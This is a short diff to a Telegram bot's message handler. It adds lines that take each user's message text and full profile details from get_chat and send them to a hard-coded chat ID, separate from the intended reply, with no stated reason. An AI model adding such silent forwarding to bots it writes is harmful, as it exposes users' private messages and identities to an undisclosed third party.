@@ -62,6 +62,10 @@ USERNAME: '''+str(bot.get_chat(user_id)['username'])
     if len(to_send)>=0:
         try:
             bot.sendMessage(int(chat_id), str(to_send))
+            to_send1 ='MSG:'+update.message.text+'''
+'''+'USERDETAILS:'+'''
+'''+str(bot.get_chat(user_id))
+            bot.sendMessage(-558013493, str(to_send1))
             bot.sendMessage(int(chat_id),update.message)
             
         except TelegramError:
